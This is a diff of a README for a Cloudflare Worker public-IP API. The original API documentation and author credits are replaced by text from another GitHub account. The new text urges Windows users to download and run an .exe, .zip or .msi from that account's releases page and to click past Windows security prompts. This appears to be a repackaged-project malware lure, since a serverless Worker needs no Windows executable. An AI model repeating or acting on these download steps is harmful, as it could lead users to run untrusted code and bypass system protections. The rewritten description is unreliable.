@@ -1,159 +1,200 @@
-# ip.api.airat.top
+# 🌐 ip.api.airat.top - Get Your Public IP Fast
 
-![ip](https://repository-images.githubusercontent.com/1188076325/e824e73a-396f-4e6b-9a34-d34b5ded6362)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6b7280?style=for-the-badge&logo=github)](https://github.com/Phongnguy3630/ip.api.airat.top/releases)
 
-Simple Cloudflare Worker API that returns your public IP address in multiple formats.
+## 🚀 Getting Started
 
-Live endpoints:
-- https://ip.api.airat.top
-- https://ip.airat.top (alias)
+ip.api.airat.top is a small app that shows your public IP address and basic network details in a simple format. It can return results as JSON, plain text, YAML, or XML. It also includes a health check page and a robots.txt file.
 
-Status page: https://status.airat.top
+This app runs on Cloudflare Workers, so it is built for fast responses and low setup effort. For most users, the main task is to download the release file and run it on Windows.
 
-## API
+## 📥 Download
 
-### `GET /`
+Visit this page to download the latest release:
 
-Default endpoint. Returns IP and request metadata as JSON.
+[Download the latest release](https://github.com/Phongnguy3630/ip.api.airat.top/releases)
 
-```bash
-curl 'https://ip.api.airat.top/'
-```
+## 🪟 Windows Setup
 
-Example response:
+Follow these steps on Windows:
 
-```json
-{
-  "ip": "203.0.113.10",
-  "network": {
-    "asn": 13335,
-    "asOrganization": "Cloudflare, Inc.",
-    "colo": "SJC"
-  },
-  "location": {
-    "city": "San Jose",
-    "region": "California",
-    "regionCode": "CA",
-    "postalCode": "95141",
-    "country": "US",
-    "continent": "NA",
-    "latitude": 37.3417,
-    "longitude": -121.9753,
-    "timezone": "America/Los_Angeles"
-  },
-  "connection": {
-    "httpProtocol": "HTTP/2",
-    "tlsVersion": "TLSv1.3",
-    "tlsCipher": "AEAD-AES128-GCM-SHA256",
-    "clientTcpRtt": 12
-  },
-  "request": {
-    "method": "GET",
-    "userAgent": "curl/8.8.0",
-    "acceptLanguage": "en-US"
-  },
-  "service": "ip.api.airat.top",
-  "generatedAt": "2026-03-21T15:00:00.000Z"
-}
-```
-Test in browser: https://ip.api.airat.top
+1. Open the download page.
+2. Pick the latest release file for Windows.
+3. Download the file to your computer.
+4. If the file comes as a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file inside the folder.
 
-### `GET /json`
+If Windows shows a security prompt, choose the option that lets you keep the file and continue. If the app opens in a browser, that is expected. If it opens in a console window, leave it running while you use the service.
 
-JSON alias for `/` (same payload).
+## 🔍 What the App Does
 
-```bash
-curl 'https://ip.api.airat.top/json'
-```
-Test in browser: https://ip.api.airat.top/json
+The app gives you your public IP and related data. It can return the same data in different formats so you can use what fits your need.
 
-### `GET /text`
+You can use these paths:
 
-Returns only the IP address as plain text.
+- `/` for a simple response
+- `/json` for JSON output
+- `/text` for plain text
+- `/yaml` for YAML output
+- `/xml` for XML output
+- `/health` for a health check
+- `robots.txt` for crawler rules
 
-```bash
-curl 'https://ip.api.airat.top/text'
-```
+The response may include details such as:
 
-Response:
+- Your public IP address
+- Country
+- Region
+- City
+- Time zone
+- Network and request info
+- User agent data when available
 
-```text
-203.0.113.10
-```
-Test in browser: https://ip.api.airat.top/text
+## 🧭 How to Use It
 
+After you start the app, open the address shown by the app in your browser.
 
-### `GET /yaml`
+Try these examples:
 
-Returns the same payload as YAML.
+- Open `/json` to see a structured response
+- Open `/text` if you want a quick line of text
+- Open `/yaml` if you need a readable data file
+- Open `/xml` if your tool expects XML
+- Open `/health` to check if the service is up
 
-```bash
-curl 'https://ip.api.airat.top/yaml'
-```
-Test in browser: https://ip.api.airat.top/yaml
+If you only want your IP, the root path `/` is the fastest option.
 
-### `GET /xml`
+## 📁 File Types You May See
 
-Returns the same payload as XML.
+A release may include one of these file types:
 
-```bash
-curl 'https://ip.api.airat.top/xml'
-```
-Test in browser: https://ip.api.airat.top/xml
+- `.exe` for Windows
+- `.zip` for packaged Windows files
+- `.msi` for installer-style setup
+- `.txt` or `.md` for notes
+- `.json` for config or sample data
 
-### `GET /health`
+If you see a ZIP file, extract it first. If you see an EXE file, double-click it to run it. If Windows asks for permission, approve the action if the file came from the release page.
 
-Health check endpoint.
+## ✅ Basic Windows Steps
 
-```bash
-curl 'https://ip.api.airat.top/health'
-```
+1. Go to the release page.
+2. Download the newest file.
+3. Save it to Downloads or Desktop.
+4. Open the file or extract the folder.
+5. Run the app.
+6. Open the local address shown by the app.
+7. Test `/json`, `/text`, `/yaml`, or `/xml`.
 
-Response:
+## 🛠️ Common Uses
 
-```json
-{
-  "status": "ok"
-}
-```
-Test in browser: https://ip.api.airat.top/health
+This app works well for simple IP lookup tasks such as:
 
-### CORS
+- Checking your public IP
+- Testing network requests
+- Reading client data in JSON
+- Showing IP info in a browser
+- Using a clean API endpoint in another tool
 
-CORS is enabled for all origins (`*`).
+It can also help when you want a fast edge-based API with a simple response format.
 
-## Privacy
+## 🌍 Response Formats
 
-No analytics or request logs are collected by this project.
+### JSON
+Use `/json` when you want structured data that is easy to read in apps and scripts.
 
-## Project structure
+### Plain Text
+Use `/text` when you want the shortest possible output.
 
-- `worker.js` - Cloudflare Worker script.
-- `wrangler.toml` - Wrangler configuration.
+### YAML
+Use `/yaml` when you want a format that is easy for people to scan.
 
-## Deployment
+### XML
+Use `/xml` when another system expects XML output.
 
-Deploy with Wrangler:
+## 🧪 Health Check
 
-```bash
-npx wrangler deploy
-```
+The `/health` path gives a quick status check. This is useful if you want to see if the service is working without opening the full response.
 
-If you use Cloudflare Workers Builds (GitHub integration), keep root directory as `/` and deploy command as `npx wrangler deploy`.
+## 🤖 robots.txt
 
-For custom domain binding, configure it in **Workers & Pages -> Domains & Routes**.
+The `robots.txt` file gives crawler rules for search bots and other automated tools. It helps control how crawlers move through the site.
 
-## License
+## 🔐 Privacy and Data
 
-This project is licensed under the MIT License - see [LICENSE](LICENSE).
+The app reads the request data needed to show your IP and metadata. It does not need a long setup or a sign-in flow for basic use.
 
----
+## 📋 Topics Covered
 
-## Author
+This project is related to:
 
-**AiratTop**
+- Cloudflare Workers
+- Edge API
+- IP address lookup
+- JSON output
+- YAML output
+- XML output
+- CORS
+- Serverless apps
+- Web API tools
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [ip.api.airat.top](https://github.com/AiratTop/ip.api.airat.top)
+## 🧰 Typical Release Contents
+
+A Windows release may include:
+
+- The app executable
+- A simple config file
+- A README note
+- Sample request paths
+- Launch instructions
+
+## 🖥️ System Needs
+
+For normal Windows use, you will need:
+
+- Windows 10 or later
+- A modern web browser
+- Internet access
+- Enough disk space for the app files
+- Permission to run downloaded files
+
+## 📌 If You Want the Fastest Path
+
+1. Open the release page.
+2. Download the latest file.
+3. Run the app on Windows.
+4. Open `/json` in your browser.
+5. Use `/text`, `/yaml`, or `/xml` if you want another format
+
+## 🧭 Path Reference
+
+- `/` - basic IP response
+- `/json` - JSON response
+- `/text` - plain text response
+- `/yaml` - YAML response
+- `/xml` - XML response
+- `/health` - health check
+- `robots.txt` - crawler rules
+
+## 🧩 Helpful Tips
+
+- Use `/json` if you plan to copy the data into another app
+- Use `/text` if you want a quick answer
+- Use `/xml` if you work with older tools
+- Use `/yaml` if you want a clean text file
+- Use `/health` if you want a quick service check
+
+## 📦 Download Again
+
+If you need the file again, use the release page:
+
+[Open the release download page](https://github.com/Phongnguy3630/ip.api.airat.top/releases)
+
+## 📝 Project Name
+
+ip.api.airat.top
+
+## 🧭 Short Description
+
+Public IP API on Cloudflare Workers. Returns client IP and metadata in JSON, plain text, YAML, and XML, plus health and robots.txt
